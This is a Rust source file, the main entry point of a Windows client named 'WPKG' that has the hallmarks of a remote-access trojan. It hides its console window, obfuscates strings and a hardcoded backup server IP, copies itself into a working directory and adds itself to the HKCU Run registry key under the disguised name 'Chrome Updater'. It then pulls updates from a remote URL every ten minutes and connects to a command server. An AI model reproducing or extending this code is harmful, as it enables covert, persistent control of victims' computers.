// Remove console window in Windows OS
#![windows_subsystem = "windows"]
// TODO: delete it
#![allow(dead_code)]

mod addreses;
mod client;
mod globals;
mod logger;
mod unwrap;
mod updater;
mod utils;

use std::env;
use std::{thread, time};

use tracing::*;
#[cfg(target_os = "windows")]
use wpkg_crypto::decode;
use wpkg_macro::encode;

use crate::addreses::{Address, Addresses};

/// Server ip backup if api isn't available
pub const TCP_BACKUP_IP: &str = encode!("136.243.156.104");
/// Server port backup if api isn't available
pub const TCP_BACKUP_PORT: u32 = 3217;

#[tokio::main]
async fn main() {
    // init logger
    logger::init();

    let args: Vec<String> = env::args().collect();
    match args.iter().any(|v| v == "--update") {
        true => {
            let possision = args.iter().position(|r| r == "--update").unwrap();
            updater::install_update(&args[possision + 1].to_string())
                .await
                .expect("Error updating");
        }
        false => (),
    }
    match updater::check_updates().await {
        Ok((up_to_date, _, url)) => {
            if !up_to_date {
                if let Err(err) = updater::update(&url).await {
                    error!("Updating failed: {err}");
                }
            }
        }
        Err(e) => error!("Failed to check updates: {e}"),
    }

    // get tcp server ip address from the api
    let tcp_address = Addresses::get().await.unwrap_or_default();
    let tcp_address = tcp_address
        .tcp
        .get(0)
        .unwrap_or(&Address::default())
        .format();

    #[cfg(target_os = "windows")]
    {
        use crate::utils;
        use std::env;
        use std::fs;
        use std::path::Path;
        use std::process;
        use sysinfo::{System, SystemExt};

        let install = || -> anyhow::Result<()> {
            let exe_path = env::current_exe()?.display().to_string();

            let config_dir = utils::get_working_dir()?;
            let exe_target = format!("{}\\{}", &config_dir, &decode(encode!("wpkg.exe")));

            if exe_path != exe_target {
                info!("WPKG not installed. Installing in {}...", &config_dir);

                if !Path::new(&exe_target).exists() {
                    // copying executable
                    fs::copy(exe_path, exe_target.clone())?;

                    // adding to autostart
                    utils::run_process(
                        &decode(encode!("reg")),
                        vec![
                            &decode(encode!("add")),
                            &decode(encode!(
                                "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                            )),
                            "/f",
                            "/v",
                            &decode(encode!("Chrome Updater")),
                            "/t",
                            &decode(encode!("REG_SZ")),
                            &decode(encode!("/d")),
                            &exe_target,
                        ],
                        true,
                    )?;
                }

                // check if process is runned
                let mut runned: i32 = 0;
                let s = System::new_all();
                for _ in s.processes_by_name(&decode(encode!("wpkg.exe"))) {
                    runned += 1;
                }

                // run wpkg
                if runned <= 1 {
                    utils::run_process_with_work_dir(&exe_target, vec![], false, &config_dir)?;
                } else {
                    error!("WPKG is runned. Exiting...");
                }

                process::exit(0);
            }
            Ok(())
        };

        if let Err(err) = install() {
            error!("Failed to install WPKG: {}", err);
            process::exit(0);
        }
    }

    tokio::spawn(async move {
        info!("Started update check thread");

        loop {
            thread::sleep(time::Duration::from_secs(10 * 60)); // check every 10 minutes

            match updater::check_updates().await {
                Ok(_) => info!("Updates has been checked"),
                Err(e) => error!("Failed to check updates: {e}"),
            }
        }
    });

    // connect to the ServerD
    client::connect(tcp_address).await;
}
